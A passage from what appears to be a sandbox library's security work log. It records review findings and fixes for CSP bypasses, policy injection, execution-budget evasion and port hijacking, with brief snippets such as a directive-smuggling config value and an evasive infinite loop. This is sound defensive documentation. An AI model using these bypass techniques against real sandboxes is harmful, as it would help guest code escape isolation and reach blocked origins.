reader of the environment count; a unit test forces every dispatch-then-act path and fails on a hand-written
check. B6: the bridge builds the `Request` before it records anything, and what the constructor refuses is
`refused`; the ByteString regex is gone (the platform's rule, not a copy), `fetch()` gets that `Request`, and
`failed` is documented as "the browser's fetch rejected", not "a request was sent". B3: `_dispatchLog` makes
the detail itself from the raw line and its source.

### S23 · Strict mode: the entry's scope and the prelude's lists — ✅ **done**

*From the review, C2 and C3; [ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-14-adversarial-review).*

**Verified** (2026-10-14, all three engines): the entry was appended to the prelude in one classic script, whose
declarations are instantiated before any of it runs; a top-level `function Worker() {}` in the entry made the
prelude's deletion fail silently (Worker stayed, as the guest's function), and `function Reflect() {}` replaced a
global the prelude captures. The prelude's lists were written through inherited index setters, which guest code
can observe.

**Done**: the entry runs inside `(function () { … }).call(this)` (**top-level declarations of a strict-mode entry
are now local**; assign `globalThis.x` to share); the prelude's first step refuses to start if the global object
holds a non-configurable function, which only a top-level declaration of an entry that escaped its scope leaves;
a name the prelude cannot delete is an error. The prelude's lists have no prototype. Tests:
`test/e2e/review-strict.spec.ts`, `src/lib/in-sandbox-view.test.ts`, `test/unit/strict.test.ts`.

### S24 · Strict view residuals: CSS references, the shared violation cap, browser link actions — ✅ **done**

*From the review, C1, C4 and C5.*

- **C1, A8 on attributes only** — ✅ done by construction (follow-up audit 2026-10-14). The renderer does not read
  `<style>` text or CSS escapes in `style` attributes, so rendered CSS can name the worker's copies of registered
  files and (before) the worker's own source URL. The guarantee is about content: the view renders no `blob:`
  content but registered files. It held by the source's type and prefix; now the view revokes the source URL on
  the worker's first render-port message (`VIEW_STARTED`, after the whole worker script ran), so it resolves
  nowhere. Revoking earlier had broken WebKit's `sandboxFiles`; at this point `sandboxFiles`, the worker's own
  `blob:` URLs, Blob reads and `execute()` work on all three engines, and WebKit's in-worker muting of later error
  text from the revoked script is routed around (the view logs those errors, with their text).
  [ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-14-follow-up-audit-c1-c4-and-c5-by-construction).
  Asserted: `test/e2e/review-strict.spec.ts` ("C1", 3 tests), `src/lib/in-sandbox-view.test.ts`.
- **C4, the view's violation cap was shared** with the guest's own refused loads — ✅ done (follow-up audit): the
  view and the host count the view's reports per directive (the browser names the directive there; the logic port
  keeps one count, since guest code names it), bounded at (known directives + 1) × 100. 150 refused images no
  longer hide a later `script-src-attr` report. Asserted: `review-strict.spec.ts` ("C4"),
  `test/unit/followup-guarantees.test.ts`.
- **C5, browser link actions** — ✅ done (option B, approved by the owner on 2026-10-14). Rendered links kept their
  `href`; the view cancels clicks and submits, but "copy link address", "open in new tab", hover and dragging a link
  are the browser's own actions, outside any page's control, and they carried the guest's URL. Now the renderer
  replaces every hyperlink href (HTML `a`/`area`, SVG `a` with `href` and `xlink:href`, MathML) with one constant,
  `about:blank#`, before insertion; no option. The link stays a link (focusable, role `link`, `:link`), clicks and
  Enter are still cancelled and delivered by id; external links go through a host method the embedder exposes
  (`openExternal(url)`). The constant was measured against `#`, `""`, `about:blank`, `about:invalid`,
  `javascript:void(0)` and `data:,` on all three engines (reasoning in `INERT_HREF`,
  `src/lib/in-sandbox-view.ts`). Asserted: `review-strict.spec.ts` ("C5": the href, the document without the
  guest's marker, `:link`, focus, role and a real drag's data read from outside; a real click and Enter delivered,
  nothing navigated), `src/lib/in-sandbox-view.test.ts`.

### S25 · Guest data can carry own `__proto__` keys — **documented** (by design)

*From the review, B8.*

Structured clone keeps an own `__proto__` key (measured in all three engines), so call arguments, results and
`sandbox-log` args from the guest can hold one. Reading such an object is safe, and it never changes
`Object.prototype`; merging it with `Object.assign` sets the target's prototype. Documented next to `expose()` and
`sandbox-log` in the README; `deepMerge` (the element's own config merge) skips the key (S20). Asserted:
`test/e2e/review-channels.spec.ts` ("B8").

### S26 · A build that fails is a termination; the config is a copy — ✅ **done**

*From the follow-up by-construction audit of the review (2026-10-14).*

**Verified**: a string directive value (`'img-src': "x; script-src *"`) or a `Proxy` array made `setConfig()` throw
from the build: the old environment was torn down, the state stayed `loading`, with no frame and no `terminated`
event. And the merged config shared the caller's arrays, so an array changed after `setConfig()` changed the
policy the next `reset()` built.

**Done**: `initialize()`, the one place a build starts, and the frame's load handler, where it completes, end any
throw with `terminated` and `the environment could not be built: …`. `setConfig()` reads one `structuredClone` of
its argument; a config that cannot be cloned or is not an object applies nothing and terminates with
`the configuration could not be used: …`, refusing every build until a usable config arrives (like A4's unknown
mode). `setConfig()` never throws. [ADR-003 amendment](ADR-003-lifecycle-and-liveness.md#amendment-2026-10-14-one-rule-per-budget-build-and-missing-environment).
Tests: `test/unit/policy-guarantees.test.ts` ("Every build failure is a termination"), `test/e2e/review-followup.spec.ts`.

### S27 · A committed inert file could run as a script of the next build — ✅ **done**

*From the [focused review 2026-10-14](security/FOCUSED-REVIEW-2026-10-14.md), W1 (high).*

**Verified** (2026-10-14, all three engines): a guest-written `app.js` committed as `text/plain` (inert, so no
`{ code: true }`) became the script of the next build's `<script src="app.js">` and ran: reference resolution
ignored the load kind, and engines run a classic `blob:` script whatever its type. Host-registered mistyped files
loaded the same way.

**Done**: one table (`src/lib/load-kinds.ts`) of which types each kind of load admits; markup and inline CSS
resolution, registered stylesheets' references, the strict renderer, the import map, the strict entry and the
policy's `blob:` admission all read it. A mismatch stays as written, with one warning. Limits stated in API.md and
[ADR-004](ADR-004-files-as-blob-urls.md#amendment-2026-10-14-a-reference-names-a-file-only-for-the-kind-of-load-its-type-is-for):
committed CSS still styles the next build's markup; code that loads `sandboxFiles.url()` as a script itself
decides what runs. Tests: `src/lib/load-kinds.test.ts`, `test/unit/focused-review.test.ts`, `test/e2e/focused-review.spec.ts`.

### S28 · Guest writes: rate windows, stale marks, a synchronous throw, a documented disagreement — ✅ **done**

*From the focused review, W2–W5 (low, info).*

**Done**: the guest-write rates and the guest log rate are one sliding-window limiter (`src/lib/rate-limit.ts`), so
"at most N in any one-second window" holds (fixed windows let 199 of 100 writes, 1999 of 1000 lines through around a
boundary); auto-sizing already held it by spacing its writes (now asserted) and the fetch bridge has no per-second
limit (W2). A removal mark whose path the host unregistered is forgotten before marks are listed or committed (W3).
`sandboxFiles.write()` inspects its entry inside its `try`, so it always returns a promise (W4). API.md states when
the guest's view and `listGuestWrites()` disagree by design: a `fileswritten` listener that terminates, or blocks
past the 30 s call timeout (W5). Tests: `test/unit/focused-review.test.ts`.

### S29 · SVG animation re-animated a checked attribute in the strict view — ✅ **done**

*From the focused review, F1 (medium).*

**Verified** (all three engines): `<set>`/`<animate>` inside a rendered link set its `href` back to the guest's
URL after the renderer made it `about:blank#` (`animVal`, and Chromium's accessibility tree); inside an `<image>`
it loaded an unchecked URL (Chromium, Firefox). **Done**: the renderer removes every SVG animation element
([ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-14-focused-review-no-attribute-changes-after-the-renderer)).
Tests: `test/e2e/focused-review.spec.ts` ("F1"), `src/lib/in-sandbox-view.test.ts`.

### S30 · `workerExecutionTimeout` could be evaded — ✅ **done**

*From the focused review, F2 (medium).*

**Verified** (worker and strict mode, all three engines): `setTimeout(() => { for (;;) {} }, 0)` stopped its own
budget and looped; replacing `globalThis.Function` made the bootstrap report completion before the embedder's code
ran. **Done**: the budget is "the event loop is free at each deadline": the host pings through the bootstrap's
captured handler and terminates unless it answers within `EXECUTION_TIMEOUT_GRACE_MS`; the guest reports nothing;
executed code is compiled with a captured `Function`
([ADR-003 amendment](ADR-003-lifecycle-and-liveness.md#amendment-2026-10-14-the-execution-budget-is-a-free-event-loop-at-the-deadline)).
Tests: `test/e2e/focused-review.spec.ts` ("F2"), `test/unit/followup-guarantees.test.ts`.

### S31 · Error text in reasons, assigned config keys, two eval writers, a refused config stored; fetch per build — ✅ **done**

*From the focused review, F3–F6 (low, info) and a hardening.*

**Done**: reasons and host lines carry a fixed text and the error's name, never its message; the strict entry's
error text is a guest line (F3). Every CSP step writes config-derived keys with one helper, `defineData`, and reads
directives as own keys only (F4: `drop-meta-ignored.ts` assigned a configured `__proto__` as its output's
prototype). `addEvalSource` is the one writer of `'unsafe-eval'`, for the host and the strict view, and never puts
it in `default-src` (F5). `setConfig()` checks and warns on the candidate and stores it last; a `connectionsAllowed`
that is not an object is refused (F6). `sandbox:fetch` is registered per build, closed over that build's bridge
([ADR-006 amendment](ADR-006-fetch-bridge.md#amendment-2026-10-14-the-method-is-bound-to-its-build)).
Tests: `test/unit/focused-review.test.ts`.

### S32 · The guest announces its port; a second announcement ends the environment — ✅ **done**

*From the [broad review 2026-10-14](security/BROAD-REVIEW-2026-10-14.md), CB1 (medium/low) and PD8 (low);
[ADR-002 amendment](ADR-002-host-guest-broker.md#amendment-2026-10-14-broad-review-the-guest-announces-its-port).*

**Verified** (all three engines): guest code that called `document.open()` before the wrapper's load erased the
bootstrap's capture listener, installed its own and received the host's INIT_PORT; it then posted on the host's port
(and could hand it to a nested worker that answers the watchdog). A guest that reloaded itself left a dead channel
in `ready`. **Done**: the bootstrap's first statement makes the channel and posts one end to the host page; the host
accepts exactly one announcement per environment, from the guest frame's window, and terminates on a second one.
Worker mode's frame does the same. Tests: `test/e2e/broad-review.spec.ts` ("CB1", "PD8"), `review-channels.spec.ts`.

### S33 · Lifecycle: calls queued while loading, a bounded load, one answer per build, one document — ✅ **done**

*From the broad review, CB3, CB5, CB7 (low, info); [ADR-003 amendment](ADR-003-lifecycle-and-liveness.md#amendment-2026-10-14-loading-is-bounded-one-answer-per-build-one-document).*

**Done**: a queued call that timed out leaves the queue (it ran at the next flush before); `loading` ends after
`LOAD_TIMEOUT_MS` with a reason (Chromium and WebKit stayed `loading` while a guest kept its document open); a
`terminated` listener that rebuilds from the same inputs gets one answer, not a recursion of about 590; an element
moved into another document stops its guest and builds nothing there (Firefox had lost its methods and left the
guest running). Tests: `test/e2e/broad-review.spec.ts`, `test/unit/broad-review.test.ts`. *Since S46 the deadline
bounds only the guest's check-in: a guest that keeps its document open is `ready`, and its slow images never count.*

### S34 · Policy: no `data:` workers; every policy step widens only its own kinds — ✅ **done**

*From the broad review, PD1 (high, WebKit) and PA1 (info, latent); [ADR-004 amendment](ADR-004-files-as-blob-urls.md#amendment-2026-10-14-broad-review-answers-from-the-build-file-sources-widen-only-their-kinds).*

**Verified**: WebKit ran a `data:` SharedWorker outside the guest policy (fetch, WebSocket, `importScripts` reached a
blocked listener, no violation). File sources' `blob:` reached `worker-src` through its fallback to `script-src`.
**Done**: the default `worker-src` is `blob:`; a policy step removes `data:` from what governs worker loads; every
step ends with `assertWidensOnly`. Upstream report text: [report appendix](security/BROAD-REVIEW-2026-10-14.md#appendix-upstream-reports).

### S35 · Guest-realm hardening: keepalive, history traversal, `window.name`, DNS prefetch — ✅ **done in the guest realm**; residuals are cooperative-mode limits (S44)

*From the broad review, PD2 (high, Firefox platform bug), PD3, PD4 (medium), PD6 (low).*

**Done** before guest code, with captured primitives: `fetch()` refuses `keepalive` (Firefox sent it past
`connect-src`); `history.back/forward/go` and the Navigation API's traversal do nothing (Firefox and WebKit moved the
host page); `window.name` is inert (host named targets reached the guest frame); `x-dns-prefetch-control: off`.
**Residuals** (default mode, asserted per engine): frames the guest creates keep the platform's behaviour (Firefox
keepalive; history traversal in Firefox and WebKit; named targets); WebKit opens a connection for
`<link rel=preconnect>`. Strict mode runs no guest script in a document.

### S36 · Focus, clipboard and messages to the host window — **documented** (a cooperative-mode limit, S44)

*From the broad review, PD5 (medium) and PD7 (low).*

Guest code can take focus from the host page (Chromium, Firefox) and, after a user's click in the guest, write the
clipboard (Firefox `writeText()`, Chromium and Firefox `execCommand('copy')`): measured and asserted per engine. The
guest can post messages to the host window; the playground now checks `event.source`, and README and API.md say so.

### S37 · No global lookups on EXECUTE; answers from the build; one fetch refusal text; packaging; presets; parse properties — ✅ **done**

*From the broad review, CB2, CB4, CB6, PD9, I1, I2, PA2, PA3 (low, info).*

**Done**: the EXECUTE path requires a string and converts nothing (a replaced `String` chose the code before);
guest writes are answered from the build's copy of the store, not the live store; the guest gets one refusal text
for every unlisted origin (the host's reason is in the record); `build:lib` cleans `dist/`, `build.ts` is gone, the
package lists its files and the smoke test asserts the tarball exactly, no source map; markup presets leave
`scriptUnsafe` off; property tests for the host's and the guest's parse of rewritten markup and for inline-module
rewrites; a test keeps the strict renderer's link kinds equal to `load-kinds.ts`.

### S38 · The strict renderer was a list of what to remove — ✅ **done**

*From the broad review, reviewer C (strict mode).*

**Done**: the renderer keeps only allowlisted elements per namespace and allowlisted attributes; unknown HTML
elements are unwrapped, unknown SVG and MathML elements removed with their content; `use`, markers, SVG filters,
SVG `image`, `foreignObject`, handlers, form targets, popovers and invoker commands are gone
([ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-14-broad-review-an-allowlist-renderer-and-a-bounded-view)).
Tests: `test/e2e/broad-strict.spec.ts`, `src/lib/in-sandbox-view.test.ts`.

### S39 · A file the strict view showed could open as a script-running document — ✅ **done**

*ST1, medium.* The view mints URLs only for `VIEW_FILE_TYPES` (never a document), and `data:` is dropped from the
directive that governs images. Tests: `test/e2e/broad-strict.spec.ts` ("ST1"), `test/unit/strict.test.ts`.

### S40 · One render could stall the host by fan-out; the view's document was unbounded — ✅ **done**

*ST2, medium.* No instancing elements; at most `VIEW_MAX_ELEMENTS` elements and `VIEW_MAX_DEPTH` levels in the
view, counted over the resulting document; a refused render is dropped, acknowledged and logged. Tests:
`test/e2e/broad-strict.spec.ts` ("ST2"), `src/lib/in-sandbox-view.test.ts`.

### S41 · An event detail was bounded per string, not in total — ✅ **done**

*ST3, low.* One character budget per detail, `truncated: true` when cut. *ST4, info*: the entry marker is named per
build. *I1*: the renderer's link kinds come from load-kinds.ts. Tests: as S40, plus `test/unit/strict.test.ts`,
`src/lib/load-kinds.test.ts`.

### S42 · CSS paint cost in the strict view can stall the host page — ✅ **accepted** (documented; 2026-10-15)

**Restated** by review round 1 (S52): host-page availability is not protected wherever the view shares the host page's
thread (WebKit always, Firefox, Chromium depending on its process model), not only in WebKit; the view's budgets bound
the common cases, CSS paint and bidirectional text layout are not bounded.

**Accepted** (owner's decision with S48): in WebKit, strict mode protects confidentiality and egress, not the host
page's availability. Cooperative mode is no better there: a guest `while (true) {}` already freezes WebKit's host page
(S6). Stated in the README ("What strict mode does not cover"), API.md and the
[ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-15-strict-is-the-default-cooperative-modes-limits-are-frozen).
Options (a)–(c) below stay on record; (c), an out-of-process view, is ADR-005's "Revisit if".


*Found while measuring ST2.* The renderer does not read CSS, and the view runs on the host page's thread (Firefox,
WebKit, and Chromium in the measured configuration). A filter list on many elements costs their product: in WebKit,
10 `blur()` functions on 1 000 elements (88 KB) stalled the host 3.7 s, 100 on 1 000 more than 180 s; Chromium and
Firefox stayed under 0.2 s. Options: (a) a stylesheet of the view's own, in a first anonymous cascade layer with
`!important`, that sets `filter` and `backdrop-filter` to `none`, together with removing the `style` attribute (inline
declarations outrank layers); (b) parse guest CSS with the browser's own parser (a constructed stylesheet) and keep
only allowlisted properties; (c) a view out of the host's process where the platform offers one. (a) is a list of
expensive properties, so not by construction; (b) is the allowlist answer and costs every guest some CSS.

### S43 · A guest worker keeps only allowlisted globals — ✅ **done**

*From the [independent verification 2026-10-14](security/VERIFICATION-2026-10-14.md), V1 (high on Firefox);
[ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-14-independent-verification-the-workers-globals-are-an-allowlist).*

**Verified** (all three engines, and on a plain page with a header policy): in Firefox, `new EventSource(url)` from the
strict-mode worker and from worker mode's worker reached an origin `connect-src` blocks, and `new FontFace(…, 'url(…)')`
one `font-src` blocks, with no violation; the document's EventSource, and every other network API of the worker, were
refused. **Done**, by construction: the worker's first statement (worker and strict mode) keeps only `WORKER_GLOBALS`
(`src/lib/worker-globals.ts`) and deletes every other name from the global, its scope prototypes and the navigator's
prototype; four listed globals can request (`fetch`, `XMLHttpRequest`, `WebSocket`, `importScripts`), each measured as
governed on all three engines; an undeletable name fails the worker closed. Worker mode has no nested `Worker` any
more. Residual: a worker the guest creates in iframe mode (S44). Upstream report text:
[broad review appendix](security/BROAD-REVIEW-2026-10-14.md#v1--firefox-bugzilla-core--dom-security-security-sensitive).
Tests: `test/e2e/verification.spec.ts` ("V1"), `src/lib/worker-globals.test.ts`.

### S44 · Cooperative-mode limits, one frozen list — **documented** (limits)

*From the independent verification, V3 and H1 (measured), with the earlier residuals gathered here; frozen on
2026-10-15 with S48.* The one list, the same in the [README](../README.md#cooperative-mode-limits) and
[API.md](API.md#modes).

**Policy**: cooperative mode is for cooperative content. No new guest-realm patch is made there; a new finding in
cooperative mode is added to this list as a limit (the hardening already in the guest realm, S35, stays). None of these
applies in strict mode, the default; worker mode shares only the reports item.

- same-thread execution: where the frame shares the host page's thread (WebKit always, Chromium in some environments),
  a guest loop freezes the host page and no watchdog can stop it (S6);
- a frame the guest creates is a realm of its own: WebRTC (S13), WebKit's host URL as referrer (S17), Firefox's
  keepalive fetch (S35), history traversal (S35), a frame name the host targets (S35); `frame-src 'none'` refuses
  frames that load a URL, not frames made from markup;
- a worker the guest creates (from its document or a frame it creates): Firefox sends its `EventSource` and loads its
  `FontFace` past the policy (S43);
- WebKit opens a connection for `<link rel=preconnect>` (S35);
- focus (Chromium, Firefox) and, in a user's click, the clipboard (`writeText()` in Firefox and, in the click's own
  handler, WebKit; `execCommand('copy')` in Chromium and Firefox) (S36);
- messages to the host window; embedders check `event.source` (S36);
- the user's Ctrl-, Shift- or middle-click, or Ctrl/Shift+Enter, on a guest link opens a new tab at the guest's URL
  in Chromium and Firefox, without `allow-popups`, as for any sandboxed frame (Playwright's WebKit opens none, a
  measurement limit); so does a modifier click the guest's script synthesizes (Chromium with no gesture where its
  popup blocker lets it, Firefox within a user's activation), and Chromium submits a form that way past `form-action`
  (S53, R2-2), so `allow-forms` is an unsafe capability (S54);
- the host page's Trusted Types requirement reaches the guest: its scripts, the import map and the markup the bootstrap
  writes for registered files need Trusted Types too (S50);
- the guest's fragment navigations add entries to the tab's session history (every engine), and a navigation the
  wrapper refuses adds one in Chromium;
- guest-only stalls (the CB3 class): a guest that never finishes its document stays `ready` and its calls time out;
  Firefox's `<meta refresh>` replaces the guest with a document that announces nothing (S32); the watchdog ends either
  where it is on;
- forgeable reports: every `violation` report comes from the guest's realm, and a frame the guest creates reports to
  itself (S5);
- the host page's URL and origin: the pre-policy window of a `<meta>` policy over guest markup (S8), the host origin in
  `ancestorOrigins` and image `Referer` (S15), and WebKit's full host URL to same-site origins when asked (S18).

**What strict mode, the default, does not cover** (every default user; the same list in the README and API.md): host-page
availability wherever the view shares the host page's thread (S42, S52), CSS within the policy, worker violation reports per engine and guest-influenced,
a worker that closes itself (only the watchdog notices), memory, and the host site's cookies on requests to allowed
origins that are same-site with the host page (Firefox and WebKit, observed by the verification; every mode).

Tests: `verification.spec.ts` ("V1 … residual", "V3", "H1"), `broad-review.spec.ts` (PD2–PD8), `webrtc.spec.ts`,
`host-url.spec.ts`, `watchdog.spec.ts`.

### S45 · Verification gaps: the policy steps' input, a strict entry's first log lines, tests that could not fail, CI — ✅ **done**

*From the independent verification: 9 test gaps, V2 and the docs.*

**Done**: the policy steps after the grammar take only its output type (`PolicyTokens`) and check it at run time, so a
configured element holding several sources can never reach them (A1); a strict entry's synchronous console lines
are buffered (at most 1 000) and arrive (V2); tests now fail under the mutations that had survived (A1, C3's outbox,
F5, B1 retargeted at the host's listener, CB7 with Firefox's foreign prototype, PD7 on the playground page); Firefox's
"no WebRTC" has a positive control (loopback ICE on); the WebKit worker-violation limit is stated in its test; the
two heavy unit tests are cheaper or state their bound; a guest cannot outlive `terminate()`/`reset()` and a forged
announcement to `top` is not accepted (new tests); the strict-mode design probes run in CI (`bun run test:probes`).
Docs: README mitigation 2, B8's "Done", the reports' "skipped" wording, the adversarial review's stale claims.

### S46 · `ready` is the guest's check-in — ✅ **done**

*From the [independent verification](security/VERIFICATION-2026-10-14.md#decisions-after-the-verification), decision 1;
[ADR-003 amendment](ADR-003-lifecycle-and-liveness.md#amendment-2026-10-14-ready-is-the-guests-check-in), ADR-002
amendment.*

**Verified**: `ready` waited for the wrapper's load, which waits for the guest document's subresources, so
`LOAD_TIMEOUT_MS` (S33) terminated a legitimate guest whose images took longer than 5 s; the bootstrap announces itself
after about 26, 117 and 93 ms (Chromium, Firefox, WebKit) whatever the guest loads. **Done**, by construction: in
iframe and worker mode the host is `ready` when it accepts the announcement; the wrapper's load is only checked (a
second load, or a first load whose guest frame is not the one that announced, terminates); without `allow-scripts`
and in strict mode `ready` still comes with the load. `LOAD_TIMEOUT_MS` bounds only the check-in. In the guest (iframe
mode) a startup gate holds the host's calls and `execute()` code, in one queue, until the document is parsed (a
trusted `DOMContentLoaded`, or `complete`; never while `loading`), checked on every arriving frame; `PING` and answers
pass at once; at most `MAX_INBOUND_IN_FLIGHT` wait, then `BUSY` or a dropped `execute()` with a log line; everything on
primitives captured before guest code. A guest that never closes its document (the CB3 case) is now `ready` on every
engine and its calls time out, where Chromium and WebKit terminated it. Not covered by the gate: methods exposed from
`async` scripts, after an `await` or in a `load` handler. `watchdogTimeout` now covers the guest's startup scripts;
`autoResize` may report while the document loads. Tests: `test/e2e/ready.spec.ts`, `broad-review.spec.ts` ("CB3"),
`src/lib/in-sandbox-script.test.ts` ("the startup gate").

### S47 · The guest policy is a template; the embedder lists origins — ✅ **done**

*[ADR-007](ADR-007-typed-origins.md); owner-approved design.*

**Why**: `connectionsAllowed` took raw CSP, and every review found something dangerous to say through it (S7, S14,
S16, S19, A3, A5, PD1, PA1, ST1). Each fix was a guard rail that removed it again: a grammar, five drop steps, a fallback
table with a postcondition after every step, a strict pass-through list, a bootstrap warning. Bad states were still
representable, and the pipeline's order mattered.

**Done**, by construction:
- `origins: SandboxOrigins` (`connect`, `images`, `styles`, `fonts`, `media`, `scripts`) replaces `connectionsAllowed`,
  which is removed (ignored with one warning; fails closed). Exact origins only, parsed once at the boundary by one
  parser shared with `fetchBridge.allow` (`src/lib/origin.ts`): `https://host[:port]`, `wss://` for `connect`, plain
  `http://` for `localhost` and `127.0.0.1` only; anything else dropped with one warning; a non-object `origins` or a
  kind that is not a list refuses the config. The parsed policy is frozen and its entries branded `Origin`.
- One generator, one template per mode (`src/lib/csp/csp-generator.ts`), every directive emitted, so no fallback is
  consulted; `blob:` per kind from the load-kind table; strict never has `blob:` or origins in `script-src`;
  `'unsafe-eval'` only with `scriptUnsafe`; `manifest-src` `'none'`; `data:` unrepresentable for every kind.
- `SandboxConfig` is a union keyed by `mode`: `scripts` in strict mode is a compile error, and dropped at run time.
- Deleted: `drop-meta-ignored`, `drop-eval`, `drop-data-workers`, `drop-self`, `policy-grammar`,
  `effective-directive`, `file-sources`, `strict-policy`, `inlineScriptsAllowed`, `CSPDirectives`, `_getCSPDirectives`,
  the drop steps' warning sets.
- `fetchBridge.allow` now refuses entries the URL parser would rewrite (IPv4 shorthand, percent-encoding, non-ASCII,
  trailing dot, whitespace) and IPv6 literals ([ADR-006 amendment](ADR-006-fetch-bridge.md#amendment-2026-10-14-one-origin-parser)).

Tests: `src/lib/origin.test.ts` (the grammar, a 5000-input property), `src/lib/csp/origins.test.ts` (parsing, strict,
the types with `@ts-expect-error`), `src/lib/csp/csp-generator.test.ts` (golden policies, a 3000-config property:
directives exactly the template's, fixed ones byte-identical, every other token an origin; cooperative `script-src`
always admits the bootstrap), `test/unit/host.test.ts` (removal warning), and the e2e specs migrated on all engines.
Dropped specs, now unrepresentable: the `-elem` directive cases of the A3 class (`review-policy.spec.ts`).

### S48 · Strict is the default; `'iframe'` is renamed `'cooperative'`; cooperative mode's limits are frozen — ✅ **done**

*From the [independent verification](security/VERIFICATION-2026-10-14.md#decisions-after-the-verification), decision 2;
owner-approved design; [ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-15-strict-is-the-default-cooperative-modes-limits-are-frozen).*

**Why**: every review found its new issues in the document mode (frames and workers the guest creates, user actions,
platform gaps), and each fix was another guest-realm patch. Strict mode closes that class by construction.

**Done**:
- `DEFAULT_SANDBOX_CONFIG.mode = 'strict'`; the types agree (`StrictSandboxConfig.mode` optional,
  `CooperativeSandboxConfig.mode` required), and `origins` is parsed for the merged mode, so a config without `mode`
  drops `scripts`. A default element with only `html` renders the cleaned html and runs no guest script.
- Modes `'strict' | 'cooperative' | 'worker'`; `'iframe'` fails closed like any unknown mode (A4), the reason and the
  warning saying `('iframe' was renamed 'cooperative')`. Every internal branch, the bootstrap's `<mode> Ready` line,
  the presets, the playground and the specs follow.
- One warning per element when strict `html` holds a script element or an `on…` handler attribute (any namespace or
  case, template contents included), read with the host's inert `DOMParser` (`src/lib/markup-scripts.ts`).
- Every existing preset names the mode it was written for (`PresetRules.mode` is required); a strict demo is the
  playground's default. The e2e baseline config is cooperative, so the existing specs keep their meaning.
- Cooperative mode's limits frozen (S44); S42 accepted.

Tests: `test/unit/strict-default.test.ts`, `test/unit/policy-guarantees.test.ts` (A4, the rename),
`test/unit/presets.test.ts`, `test/unit/api-docs.test.ts`, `test/e2e/strict-default.spec.ts` (all three engines),
each failing at `8b561d1`.

### S49 · Fold worker mode into strict mode with `entry` — ⏳ **open** (P3 · M)

Worker mode is frozen as it is (S48). It duplicates strict mode without a view: a worker inside the frame, the same
worker-globals allowlist (S43), code only through `execute()`. What differs, and what folding has to decide:
`importScripts` from origins in `origins.scripts` (strict mode takes no `scripts`); nested workers, which worker mode
lost with the allowlist (S43), so nothing to keep; `WebAssembly`, which worker mode keeps (WebKit compiles it without
`'unsafe-eval'`) and strict mode keeps only with `scriptUnsafe`; and a headless strict build (no view, or a hidden
one). Until then worker mode gets no new features.

### S50 · The host page's policy reaches the sandbox's frames — ✅ **done**

*From [review round 1](security/REVIEW-ROUND-1-2026-10-15.md), R2-1 = R3-1 (medium);
[ADR-005 amendment](ADR-005-strict-mode.md#amendment-2026-10-15-review-round-1-the-views-check-in-its-character-budget-host-page-availability).*

**Verified** (all three engines, the harness served with each host policy): the frames are `srcdoc` documents and
inherit the host page's CSP list, Trusted Types and COEP. Host `script-src 'self'`: strict was `ready`, then 5 s later
"the sandbox view stopped responding"; cooperative "did not finish loading". Host `worker-src` without `blob:`: "the guest
entry failed to start". `require-trusted-types-for 'script'`: "could not be built (TypeError)" (Chromium, WebKit). Host
`style-src 'self'`: the guest frame 150 px high. COEP `require-corp`: WebKit's strict worker failed.

**Done**: strict mode is `ready` only on the view's check-in (`VIEW_READY`, on the port only its bootstrap holds); a
build whose frame loaded but whose startup script never checked in ends with "the sandbox's startup script did not run:
the host page's Content-Security-Policy must allow it"; a refused worker ends with the worker reason (a probe worker,
only on that failure path, tells it from Firefox's message-less syntax error); the element's and the view's HTML and
script sinks go through one Trusted Types policy, `web-sandbox`, that blesses only the sandbox's own documents, and a
`trusted-types` directive without that name ends the build with a reason naming it; the frame keeps its width, border
and margin without CSS and the element warns with the wrapper style's constant hash; the element is `display: block`
through a constructed stylesheet (R4-12). API.md "Host page policy" lists what each mode needs, how to read the view's
hash today, and that the host's fetch directives narrow `origins` silently. **Residuals**: the wrapper's height needs
CSS (`'unsafe-inline'` or the hash: a `srcdoc` document is never in quirks mode, and the wrapper runs no script);
WebKit refuses the view's `blob:` worker under COEP; cooperative mode inherits the Trusted Types requirement (a
cooperative-mode limit; worker mode's frame starts its worker through the policy), and under it no mode evaluates
strings (`execute()` is refused). The exported view-hash function, `viewScriptHash()`, was decided and done in S54 (R4-5).
Tests: `test/e2e/host-policy.spec.ts`, `test/unit/review-round-1.test.ts` (Trusted Types), `test/unit/channel-guarantees.test.ts`.

### S51 · One console relay; byte budgets on log lines and RPC messages — ✅ **done**

*From review round 1, R4-1 = R2-3, R3-3, R4-2 (medium), R4-6, R4-7 (low);
[ADR-002 amendment](ADR-002-host-guest-broker.md#amendment-2026-10-15-review-round-1-byte-budgets-on-every-message).*

**Verified**: `console.log(fn)` (and Symbols, DOM nodes, Events, Responses, Proxies, WeakMaps, Promises) threw
`DataCloneError` in cooperative mode, the worker and the strict worker; a strict guest's `console.log(new Uint8Array(64 MiB))`
arrived whole; a log flood within the caps cut Firefox's host page to 47 of 242 ticks and WebKit's never finished;
cooperative and worker mode relayed no uncaught error, strict mode no unhandled rejection; Chromium's "Uncaught
Uncaught". **Done**: the relay in `in-sandbox-script.ts` is the one chokepoint in every mode (the strict prelude logs
through it); it never throws, names what clone refuses by its kind, sends an `Error` as `{ name, message, stack }`,
relays every console method and uncaught errors and rejections, and bounds each line to `LOG_MAX_BYTES` (1 MiB) and the
lines it sends to 1000 and 4 MiB per second before anything is posted (the browser's own console gets a dropped line
not at all); the host measures again. RPC messages: `RPC_MAX_BYTES` (33 MiB) at sender and receiver, 64 MiB of running
inbound arguments per channel. Measured host ticks during the flood now within a few of idle on all three engines.
WebKit's muted errors ("Script error.") are documented. Tests: `test/unit/review-round-1.test.ts`, `test/e2e/review-round-1.spec.ts`.

### S52 · The strict view's budget: characters, work per second, a linear renderer — ✅ **done**

*From review round 1, R1-1, R1-2 (medium) and the availability claim; ADR-005 amendment.*

**Verified**: text was in no budget (renders of 261 000 characters into 200 targets every 20 ms: host 95–100% busy, view
up to 24 M characters); Firefox's `<wbr>` line breaking (43 000: 23 s), WebKit's `ruby` (10 000: 10.7 s), the renderer's
middle-child removals (Chromium 13 s for 38 000) and WebKit's layout of a word over many text nodes were super-linear.
**Done**: `VIEW_MAX_CHARACTERS` and `VIEW_RENDER_CHARACTERS_PER_SECOND` (1 Mi each); a linear walk that joins text runs
and drops comments; `wbr`, `ruby`, `rt`, `rp` unwrapped. S42's statement is replaced: host-page availability is not
